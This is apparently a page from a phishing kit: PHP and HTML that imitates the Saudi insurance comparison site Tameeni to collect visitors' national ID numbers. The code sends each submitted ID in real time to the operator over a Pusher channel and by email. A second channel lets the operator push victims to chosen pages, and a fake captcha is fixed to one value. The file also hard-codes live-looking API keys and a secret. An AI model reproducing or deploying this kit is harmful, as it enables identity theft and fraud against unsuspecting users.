<?php
error_reporting(0);
ini_set('display_errors', 0);
########################
session_start();

require_once('./add-efaa.php');
require_once('./dashboard/init.php');
require_once('./vendor/autoload.php');
require __DIR__ . '/vendor/autoload.php';

if (isset($_SESSION['user_id'])) {
    $User->UpdateCurrentPage($_SESSION['user_id'], 'الرئيسية');

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $dataa = [
        'userId' => $_SESSION['user_id'],
        'page' => 'الرئيسية'
    ];

    $pusher->trigger('temaeen-new', 'curreneft-page', $dataa);
}

if (isset($_GET['type'])) {
    $type = $_GET['type'];
}

if (isset($_POST['submit'])) {

    $options = array(
        'cluster' => 'ap2',
        'useTLS' => true
    );
    $pusher = new Pusher\Pusher(
        '4a9de0023f3255d461d9',
        '3803f60c4dc433d66655',
        '1918568',
        $options
    );

    $site = array(
        'ssn' => $_POST['ssn'],

        'page' => 'الرئيسية',
        'message' => 'الرئيسية',
        'type' => '1'
    );

    $_SESSION['type'] = 4;
    $_SESSION['date'] = $_POST['date'];
    $_SESSION['date2'] = $_POST['date2'];

    $id = $User->register($site);
    if ($id) {

        $_SESSION['user_id'] = $id;

        $data['message'] = $_POST['ssn'];
        $pusher->trigger('temaeen-new', 'my-event-bann', $data);

        SendMail($_POST["ssn"]);

        echo "<script>document.location.href='travel-companies.php';</script>";
    }
}
?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تأميني المنصة الأولى لمقارنة أسعار تأمين المركبات والطبي وسفر وأخطاء طبية اونلاين في السعودية</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/css/bootstrap.min.css" rel="stylesheet">

    <!-- Bootstrap JS (bundle includes Popper.js) -->
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0-alpha1/dist/js/bootstrap.bundle.min.js"></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <link href="https://fonts.googleapis.com/css2?family=Cairo:wght@200..1000&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap-icons@1.11.3/font/bootstrap-icons.min.css">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.7.2/css/all.min.css">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
    <style>
        * {
            padding: 0;
            margin: 0;
            font-family: "Cairo", serif;
            direction: rtl;
        }
        
        a {
            text-decoration: none;
        }
        /* body {
            height: 2000vh;
        }
         */
        
        .bacOne {
            background-color: #0088eb;
        }
        
        .fa-solid,
        label {
            color: rgb(153, 153, 153);
        }
        
        label {
            font-weight: bold;
            font-size: 14px;
        }
        
        .fa-solid.active {
            color: rgb(194, 77, 141) !important;
        }
        
        .text-primary {
            color: #0088eb !important;
        }
        
        .text-muted {
            color: rgb(153, 153, 153) !important;
        }
        
         ::placeholder {
            color: #d2d6da !important;
        }
        
        .bg-two {
            background-color: #0088eb;
        }
        
        .form-check-input:checked {
            background-color:#76b740 !important;
            /* Bootstrap primary color or your custom color */
            border-color:#76b740;
        }
        /* Optional: Change the check mark dot color (on some browsers) */
        
        .form-check-input {
            width: 1.1em;
            height: 1.1em;
            border: 1px solid gray;
            /* Blue border, 2px thick */
        }
        
        .group {
            display: flex;
            align-items: center;
            border: 1px solid #dee2e6;
            border-radius: 5px;
            height: 40px;
        }
        
        .bg-one {
            background-color: #0088eb;
            height: 40px;
            color: #f8f9fa;
        }
        
        .bg-o-two {
            height: 40px;
            height: 40px;
            background-color: rgb(240, 240, 240);
            color: rgb(153, 153, 153) !important;
        }
        
        .bg-a-two {
            height: 40px;
            background-color: rgb(230, 228, 228);
            color: rgb(153, 153, 153) !important;
        }
        
        .forShow {
            display: flex;
            gap: 10px;
        }
        
        .ajamaclas {
            display: flex;
            justify-content: start;
            align-items: center;
        }
        
        .calendar-table td {
            cursor: pointer;
            padding: 10px;
            text-align: center;
        }
        
        .calendar-table td:hover {
            background-color: #f0f0f0;
        }
        
        table {
            border: none;
            width: 100%;
            border-collapse: collapse;
        }
        /* Keep only the bottom border of the <thead> */
        
        thead {
            border-bottom: 1px solid #d2d6da;
            /* Set the bottom border color and thickness */
        }
        /* Remove borders from td and th */
        
        td,
        th {
            border: none;
            padding: 8px;
            text-align: center;
        }
        
        tr {
            font-weight: bold;
        }
        
        th {
            color: rgb(128, 127, 127);
        }
        /* Style for the 'today' cell */
        
        .today {
            background-color: #0088eb !important;
            color: white !important;
            border-radius: 50% !important;
            text-align: center !important;
            padding: 10px !important;
        }
        
        .disabled {
            color: #ccc;
            pointer-events: none;
        }

          .btn-primary {
            background-color: #0088eb;
            border-color: #0088eb;
        }
    </style>
</head>

<body class="bg-light">

    <div class="modal show" id="calendarModal" tabindex="-1" aria-labelledby="calendarModalLabel" aria-hidden="true">
        <div class="modal-dialog modal-dialog-centered px-4">
            <div class="modal-content text-center">
                <div class="modal-body">
                    <div class="d-flex justify-content-between align-items-center mb-2">
                        <div>
                            <select id="monthSelect" class="form-select d-none w-auto"></select>
                            <select id="yearSelect" class="form-select d-inline-block w-auto fw-bold" style="border: none;"></select>
                        </div>
                        <div>
                            <button class="btn btn-outline-secondary btn-sm" style="font-size: 20px;font-weight: bolder;border: none;" id="prevMonth">&lt;</button>
                            <button class="btn btn-outline-secondary btn-sm" style="font-size: 20px;font-weight: bolder;border: none;" id="nextMonth">&gt;</button>
                        </div>
                    </div>
                    <table class="table calendar-table">
                        <thead>
                            <tr>
                                <th>Su</th>
                                <th>Mo</th>
                                <th>Tu</th>
                                <th>We</th>
                                <th>Th</th>
                                <th>Fr</th>
                                <th>Sa</th>
                            </tr>
                        </thead>
                        <tbody id="calendarBody"></tbody>
                    </table>
                </div>
            </div>
        </div>
    </div>

    <nav class="d-flex justify-content-center py-2 shadow">
        <a href="index.php">
            <img src="./assets/tamini-removebg-preview.png" width="150"  alt="">
        </a>
    </nav>

    <div class="bacOne text-center p-3 pb-5 pt-4">
        <h4 class="fw-bold text-light"> قارن ,أمن ,استلم وثيقتك </h4>
        <small class="text-light"> مكان واحد وفّر عليك البحث بين أكثر من 20 شركة تأمين!</small>
    </div>

    <div class="container px-2" style="margin-top: -30px;">
        <div class="d-flex justify-content-between pt-3 bg-white" style="border-radius: 20px;padding: 0px 37px;">
            <a href="./index.php" class="d-flex flex-column align-items-center gap-1">
                <i class="fa-solid fa-car fs-5"></i>
                <span class="text-muted fw-bold"> مركبات </span>
            </a>
            <a href="./medical.php" class="d-flex flex-column align-items-center gap-1">
                <i class="fa-solid fa-heart-pulse  fs-5"></i>
                <span class="text-muted fw-bold">  طبي  </span>
            </a>
            <a href="./medical-mis.php" class="d-flex flex-column align-items-center gap-1">
                <i class="fa-solid fa-stethoscope fs-5"></i>
                <span class="text-muted fw-bold">  اخطاء طبية  </span>
            </a>
            <a href="#" class="d-flex flex-column align-items-center gap-1 pb-2" style="border-bottom: 3px solid#76b740;">
                <i class="fa-solid fa-plane active fs-5"></i>
                <span class=" text-primary fw-bold">  سفر  </span>
            </a>
        </div>
    </div>


    <div class="container pt-4 pb-3" style="background-color: rgb(226, 226, 226);">
        <div class="shadow-sm bg-white" style="border-radius: 15px;">
            <form action="" method="POST">

                <div class="mt-3 px-3">

                    <label for="" class="mb-2 mt-3">  رقم الهوية </label>
                    <input type="text" id="ssn" name="ssn" required minlength="10" maxlength="10" pattern="[0-9]*" inputmode="numeric" class="form-control" placeholder="رقم الهوية / الإقامة">

                    <label for="" class="mb-2 mt-3">  تاريخ بداية التغطية</label>
                    <input type="date" id="date" name="date" readonly required inputmode="numeric" class="form-control fw-bold text-center text-primary">

                    <label for="" class="mb-2 mt-3">  تاريخ نهاية التغطية</label>
                    <input type="date" id="date2" name="date2" readonly required inputmode="numeric" class="form-control text-center text-primary fw-bold">

                    <label for="" class="mb-2 mt-3">  رمز التحقق </label>
                    <div class="d-flex group mb-3">
                        <input type="text" class="form-control" required minlength="4" maxlength="4" pattern="3519" pattern="[0-9]*" style="border: none;">
                        <img src="./assets/download.jfif" class="img-fluid" width="80" alt="">
                    </div>

                    <p class="text-center text-muted my-4" style="font-size: 14px;font-weight: 650;"> أوافق على منح شركة تأميني في الاستعلام عن بياناتي من مركز المعلومات الوطني </p>


                    <div class="text-center pb-4">
                        <button type="submit" name="submit" id="butSubm" disabled class="btn btn-primary w-100 text-light fw-bold">إضهار العروض</button>
                    </div>

                </div>
            </form>
        </div>
    </div>

    <div class="container shadow mt-5">
        <div class="d-flex py-5 px-3">
            <div class="ps-4" style="border-left: 1px solid lightgray;">
                <img src="./assets/Group 6528.svg" width="100" alt="">
            </div>
            <div class="me-2 w-75 d-flex gap-2">
                <img src="./assets/Aljazira-Takaful.svg" width="80" alt="">
                <img src="./assets/Walaa.svg" width="80" alt="">
                <img src="./assets/MedGulf.svg" width="80" alt="">
            </div>
        </div>
    </div>

    <footer class="px-4 py-4 mt-5">
        <div class="text-center">
            <svg viewBox="0 0 113 36" fill="none" xmlns="http://www.w3.org/2000/svg" width="200" height="36" class="shrink-0 size-4.5 hidden md:block h-[36px] text-primary w-[165px] rtl:w-[113px]"><path fill-rule="evenodd" clip-rule="evenodd" d="M61.9452 0.0523007C62.3676 -0.050385 62.812 -0.000903602 63.2024 0.192281V1.06657L62.979 1.04859C62.7148 1.02591 62.496 1.01418 62.3242 1.01418C62.0097 1.0192 61.7533 1.2716 61.7387 1.59052C61.7155 1.70585 61.7155 1.82476 61.7387 1.94008C61.7384 2.07018 61.7927 2.19426 61.888 2.28127C61.9832 2.36829 62.1105 2.41001 62.2379 2.396H63.3048C63.3819 2.396 63.4944 2.40225 63.6322 2.4132V3.49707H60.2042V2.37801H60.4969L60.7727 2.396L60.7203 2.09883C60.5747 1.66126 60.627 1.1807 60.8632 0.78596C61.0995 0.39122 61.4955 0.122673 61.9452 0.0523007ZM63.4947 20.2664H66.6308V20.2686H70.1796V20.2682H74.7785C75.1591 20.2896 75.5321 20.1542 75.8131 19.8928C76.0782 19.6085 76.2154 19.2255 76.1921 18.8347V11.5941H79.3274V18.5204C79.3274 21.3997 77.8976 22.8394 75.0381 22.8394H70.869V22.8398H65.9388V22.8377H60.3771V5.15633H63.4954L63.4947 20.2664ZM32.4007 6.16293C32.0686 5.83266 31.6026 5.68038 31.1431 5.75187H31.1423C30.0972 5.76334 29.5692 6.32873 29.5585 7.44806C29.549 8.05002 29.8611 8.61009 30.3741 8.91207C30.8872 9.21405 31.521 9.21072 32.031 8.90336C32.5409 8.596 32.8472 8.03269 32.8316 7.43085C32.8925 6.96293 32.7329 6.4932 32.4007 6.16293ZM35.7417 20.2674H32.6064V11.5237H29.488V20.2674H26.3181V20.2686H22.0768V20.2688H18.5324V20.2682H16.6543L12.6046 19.8467L12.8804 20.8633C13.1079 21.8523 13.2805 22.8536 13.3973 23.8623C13.5686 25.17 13.6551 26.4876 13.6561 27.8068H6.69603C6.47488 27.7842 6.2559 27.7434 6.04124 27.6848C4.68163 27.4598 3.58433 26.435 3.25028 25.0784C3.15052 24.6838 3.09878 24.2783 3.09621 23.8709V20.2682H0.0980225V25.4686C0.257071 27.5689 1.68658 29.347 3.68167 29.9261C4.64149 30.254 5.64955 30.4127 6.66214 30.3953H16.7406V22.8395H17.8396V22.8401H22.7698V22.8398H27.0071V22.8387H35.053V22.8424H46.5781V22.8407H46.8376C47.8297 22.8739 48.7866 22.4651 49.4567 21.7216L49.7325 21.5292L49.6285 21.3892C50.5894 22.5478 51.9957 23.2293 53.4873 23.2593C54.9789 23.2892 56.4107 22.6647 57.4159 21.5456C59.5287 19.2119 59.5287 15.6244 57.4159 13.2907C56.4349 12.1992 55.0467 11.5773 53.5912 11.5773C52.1357 11.5773 50.7474 12.1992 49.7664 13.2907C48.7222 14.4008 48.1529 15.8851 48.1826 17.4197C48.1789 17.987 48.2541 18.552 48.406 19.0979C48.2923 19.6813 47.8298 20.1292 47.2505 20.217C46.837 20.2519 46.2685 20.2694 45.5449 20.2694V20.2712H43.4428V11.5275H40.3252V20.2712H35.7417V20.2674ZM7.23067 32.6161C7.69005 32.5446 8.15579 32.6968 8.4878 33.0269C8.81982 33.3571 8.97938 33.8266 8.9185 34.2943C8.93416 34.8961 8.62798 35.4595 8.11811 35.7669C7.60825 36.0744 6.97445 36.0779 6.46134 35.776C5.94823 35.4742 5.63605 34.9142 5.6453 34.3123C5.6566 33.194 6.18506 32.6291 7.23067 32.6177V32.6161ZM12.7602 33.0269C12.4281 32.6968 11.9623 32.5446 11.5029 32.6161V32.6176C10.4578 32.6291 9.92931 33.194 9.91749 34.3123C9.92239 35.23 10.6593 35.97 11.5633 35.965C12.4674 35.9601 13.1964 35.2121 13.1915 34.2943C13.2521 33.8265 13.0923 33.357 12.7602 33.0269ZM40.8234 25.51C40.4915 25.1797 40.0258 25.0273 39.5663 25.0985L39.5671 25.0962C38.5209 25.1092 37.9922 25.6757 37.9809 26.7955C37.9717 27.3975 38.2839 27.9574 38.797 28.2592C39.3101 28.5611 39.9439 28.5576 40.4537 28.2501C40.9636 27.9427 41.2698 27.3793 41.2541 26.7775C41.3149 26.3098 41.1554 25.8402 40.8234 25.51ZM43.8387 25.0985C44.2982 25.0273 44.7638 25.1797 45.0958 25.51C45.4278 25.8402 45.5873 26.3098 45.5265 26.7775C45.5422 27.3793 45.236 27.9427 44.7261 28.2501C44.2163 28.5576 43.5825 28.5611 43.0694 28.2592C42.5563 27.9574 42.2441 27.3975 42.2533 26.7955C42.2646 25.6757 42.7931 25.1092 43.8387 25.0962V25.0985ZM53.5898 14.0441C54.9682 14.0436 55.6574 15.1686 55.6574 17.4193V17.4208C55.6569 19.671 54.9675 20.796 53.5891 20.796C52.2107 20.796 51.5215 19.671 51.5215 17.4208C51.522 15.1702 52.2114 14.0446 53.5898 14.0441ZM74.779 6.16322C74.447 5.83299 73.9813 5.68058 73.5219 5.7518V5.75258C72.4768 5.76405 71.9483 6.32918 71.9365 7.44799C71.9271 8.04995 72.2391 8.61002 72.7522 8.912C73.2652 9.21398 73.899 9.21065 74.409 8.90329C74.9189 8.59593 75.2252 8.03262 75.2097 7.43078C75.2705 6.96301 75.1109 6.49345 74.779 6.16322ZM77.7946 5.7518C78.2541 5.68058 78.7198 5.83299 79.0517 6.16322C79.3837 6.49345 79.5433 6.96301 79.4824 7.43078C79.498 8.03262 79.1917 8.59593 78.6817 8.90329C78.1718 9.21065 77.538 9.21398 77.0249 8.912C76.5118 8.61002 76.1998 8.04995 76.2092 7.44799C76.2205 6.32918 76.7487 5.76405 77.7938 5.75258L77.7946 5.7518Z" fill="currentColor"></path>
            <path fill-rule="evenodd" clip-rule="evenodd" d="M88.7098 11.4784H87.4576C87.2556 11.4791 87.0617 11.3982 86.9186 11.2535C86.7756 11.1088 86.6952 10.9123 86.6952 10.7073V4.48233C86.6952 3.31709 87.6257 2.37248 88.7735 2.37248H94.7407C95.4038 2.37286 96.0533 2.18229 96.614 1.82291L99.1382 0.206539C99.5689 -0.0688464 100.117 -0.0688464 100.548 0.206539L103.221 1.918C103.684 2.21425 104.219 2.37149 104.766 2.37153H111.079C112.133 2.37153 112.988 3.23909 112.988 4.30928V5.95038C112.988 6.09395 112.994 11.4955 112.994 11.4955C113.042 11.9865 112.815 12.4636 112.407 12.7315L100.522 21.5446C100.363 21.6586 100.154 21.6728 99.9808 21.5814C99.8076 21.49 99.699 21.3082 99.6992 21.1101V19.0858C99.6994 18.6011 99.9281 18.1458 100.315 17.8612L109.605 10.9203C109.969 10.6594 110.18 10.2311 110.167 9.77928L110.151 6.44004C110.14 6.00861 109.949 5.60222 109.626 5.32141C109.303 5.04059 108.878 4.91158 108.457 4.96629L104.546 4.99576C103.754 5.02756 102.969 4.8265 102.286 4.41672L100.277 3.13503C100.013 2.95546 99.6666 2.95848 99.4051 3.14264L97.589 4.26364C96.8056 4.74117 95.9102 4.99601 94.9964 5.00147L91.0533 5.02524C90.1537 5.031 89.428 5.77403 89.4301 6.68725L89.4413 10.7339C89.4418 10.9312 89.365 11.1205 89.2277 11.2602C89.0905 11.3999 88.9042 11.4784 88.7098 11.4784ZM111.87 15.6655L100.941 23.871C100.29 24.3645 99.3966 24.3645 98.7455 23.871L87.8235 15.6655C87.6089 15.5039 87.3225 15.4795 87.0843 15.6026C86.8461 15.7257 86.6971 15.9751 86.6996 16.2465V25.2402C86.6983 26.3343 87.2182 27.3615 88.0952 27.9975L98.5544 35.5821C99.3266 36.1393 100.362 36.1393 101.134 35.5821L111.593 27.9975C112.467 27.3592 112.987 26.3334 112.989 25.2402V16.2389C112.989 15.97 112.84 15.7239 112.603 15.6027C112.367 15.4815 112.083 15.5058 111.87 15.6655ZM110.121 24.3034C110.152 25.0258 109.829 25.717 109.258 26.1499L101.253 32.3663C100.42 33.0025 99.272 33.0025 98.4385 32.3663L90.2215 26.0463C90.1342 25.9917 90.0551 25.9248 89.9864 25.8475C89.6924 25.5386 89.5028 25.1426 89.445 24.717C89.4209 24.61 89.4077 24.5007 89.4057 24.3909L89.4291 21.8037C89.4257 21.5873 89.5433 21.3875 89.7326 21.288C89.922 21.1885 90.1505 21.2063 90.3227 21.334L98.7822 27.4943C99.4146 27.9558 100.267 27.9558 100.899 27.4943L109.304 21.3654C109.461 21.2512 109.667 21.2353 109.839 21.3242C110.011 21.413 110.119 21.5919 110.12 21.7876L110.121 24.3034Z" fill="currentColor"></path></svg>

        </div>
        <p class="mt-4 text-muted" style="font-size: 13px;">© تأميني 2025. جميع الحقوق محفوظة شركة تأميني لوساطة التأمين الالكتروني شركة شخص واحد</p>
    </footer>


<script src="js/main.js"></script>
    <script src="https://js.pusher.com/8.2.0/pusher.min.js"></script>
    <script>
        var userIdFromSession = <?php echo json_encode($_SESSION['user_id']); ?>;

        Pusher.logToConsole = true;

        var pusher = new Pusher('4a9de0023f3255d461d9', {
            cluster: 'ap2'
        });

        var channel = pusher.subscribe('my-channel-new-jaz');

        channel.bind('page-tamen-new', function(data) {

            if (data.userId === userIdFromSession) {
                document.location.href = data.page;
            }

        });
    </script>
    <script>
        document.getElementById('date').valueAsDate = new Date();
        document.getElementById('date2').valueAsDate = new Date();

        const calendarModal = new bootstrap.Modal(document.getElementById('calendarModal'));
        var currentInput = '';

        $(document).ready(function() {
            $('#date').click(function() {
                currentInput = 'date';
                generateCalendar(currentDate, 'date');
                calendarModal.show();
            });

            $('#date2').click(function() {
                currentInput = 'date2';
                generateCalendar(currentDate, 'date2');
                calendarModal.show();
            });
        });



        document.addEventListener('DOMContentLoaded', function() {
            const form = document.querySelector('form');
            const submitBtn = document.getElementById('butSubm');

            // Listen to input events on all form fields
            form.addEventListener('input', function() {
                if (form.checkValidity()) {
                    submitBtn.disabled = false;
                } else {
                    submitBtn.disabled = true;
                }
            });

            // Also check on page load in case browser autofills
            if (form.checkValidity()) {
                submitBtn.disabled = false;
            } else {
                submitBtn.disabled = true;
            }
        });


        const calendarBody = document.getElementById('calendarBody');
        const monthSelect = document.getElementById('monthSelect');
        const yearSelect = document.getElementById('yearSelect');
        const prevMonthBtn = document.getElementById('prevMonth');
        const nextMonthBtn = document.getElementById('nextMonth');

        const months = [
            'January', 'February', 'March', 'April', 'May', 'June',
            'July', 'August', 'September', 'October', 'November', 'December'
        ];

        const today = new Date();
        const minDate = new Date(today.getFullYear(), today.getMonth(), 1);
        const maxDate = new Date(today.getFullYear(), today.getMonth() + 3, 1);

        let currentDate = new Date(minDate); // start at current month

        // Generate allowed years and months only between minDate and maxDate
        function populateDropdowns() {
            yearSelect.innerHTML = '';
            monthSelect.innerHTML = '';

            const minYear = minDate.getFullYear();
            const maxYear = maxDate.getFullYear();

            for (let y = minYear; y <= maxYear; y++) {
                yearSelect.add(new Option(y, y));
            }

            updateMonthOptions();
        }

        function updateMonthOptions() {
            const selectedYear = parseInt(yearSelect.value);
            monthSelect.innerHTML = '';

            const startMonth = selectedYear === minDate.getFullYear() ? minDate.getMonth() : 0;
            const endMonth = selectedYear === maxDate.getFullYear() ? maxDate.getMonth() : 11;

            for (let m = startMonth; m <= endMonth; m++) {
                const option = new Option(months[m], m);
                monthSelect.add(option);
            }
        }

        function isBeforeMinMonth(date) {
            return (
                date.getFullYear() < minDate.getFullYear() ||
                (date.getFullYear() === minDate.getFullYear() && date.getMonth() < minDate.getMonth())
            );
        }

        function isAfterMaxMonth(date) {
            return (
                date.getFullYear() > maxDate.getFullYear() ||
                (date.getFullYear() === maxDate.getFullYear() && date.getMonth() > maxDate.getMonth())
            );
        }

        function syncDropdowns() {
            yearSelect.value = currentDate.getFullYear();
            updateMonthOptions();
            monthSelect.value = currentDate.getMonth();
        }

        function updateCalendarFromDropdowns() {
            const year = parseInt(yearSelect.value);
            const month = parseInt(monthSelect.value);
            currentDate = new Date(year, month);
            generateCalendar(currentDate, currentInput);
        }

        prevMonthBtn.addEventListener('click', () => {
            const testDate = new Date(currentDate.getFullYear(), currentDate.getMonth() - 1);
            if (!isBeforeMinMonth(testDate)) {
                currentDate = testDate;
                syncDropdowns();
                generateCalendar(currentDate, currentInput);
            }
        });

        nextMonthBtn.addEventListener('click', () => {
            const testDate = new Date(currentDate.getFullYear(), currentDate.getMonth() + 1);
            if (!isAfterMaxMonth(testDate)) {
                currentDate = testDate;
                syncDropdowns();
                generateCalendar(currentDate, currentInput);
            }
        });

        monthSelect.addEventListener('change', updateCalendarFromDropdowns);
        yearSelect.addEventListener('change', () => {
            updateMonthOptions();
            updateCalendarFromDropdowns();
        });

        function generateCalendar(date, inputId) {
            const selectedDateInput = document.getElementById(inputId);

            const year = date.getFullYear();
            const month = date.getMonth();

            const firstDay = new Date(year, month, 1);
            const lastDay = new Date(year, month + 1, 0);
            const startDay = firstDay.getDay();
            const totalDays = lastDay.getDate();

            calendarBody.innerHTML = '';

            // Enable/disable prev/next
            prevMonthBtn.disabled = isBeforeMinMonth(new Date(year, month - 1));
            nextMonthBtn.disabled = isAfterMaxMonth(new Date(year, month + 1));

            let row = document.createElement('tr');
            let dayCounter = 1;

            for (let week = 0; week < 6; week++) {
                row = document.createElement('tr');

                for (let dow = 0; dow < 7; dow++) {
                    const cell = document.createElement('td');
                    const cellIndex = week * 7 + dow;
                    const cellDay = cellIndex - startDay + 1;

                    if (cellIndex >= startDay && cellDay <= totalDays) {
                        cell.textContent = cellDay;

                        const cellDate = new Date(year, month, cellDay);

                        const isBeforeToday = (
                            year === today.getFullYear() &&
                            month === today.getMonth() &&
                            cellDay < today.getDate()
                        );

                        // Add circle style for today
                        if (cellDate.toDateString() === today.toDateString()) {
                            cell.classList.add('today');
                            cell.style.backgroundColor = '#3f51b5'; // Circle background
                            cell.style.color = 'white'; // White text
                            cell.style.borderRadius = '50%'; // Circle border
                            cell.style.textAlign = 'center'; // Center the text
                            cell.style.padding = '10px'; // Add some padding for better circle shape
                        }

                        if (isBeforeMinMonth(cellDate) || isAfterMaxMonth(cellDate) || isBeforeToday) {
                            cell.classList.add('disabled');
                        } else {
                            cell.addEventListener('click', () => {
                                const formattedDate = `${year}-${String(month + 1).padStart(2, '0')}-${String(cellDay).padStart(2, '0')}`;
                                selectedDateInput.value = formattedDate;
                                calendarModal.hide();
                            });
                        }
                    } else {
                        cell.textContent = '';
                    }

                    row.appendChild(cell);
                }

                calendarBody.appendChild(row);
            }
        }


        // Initialize on page load
        window.addEventListener('DOMContentLoaded', () => {
            populateDropdowns();
            syncDropdowns();
        });
    </script>
</body>

</html>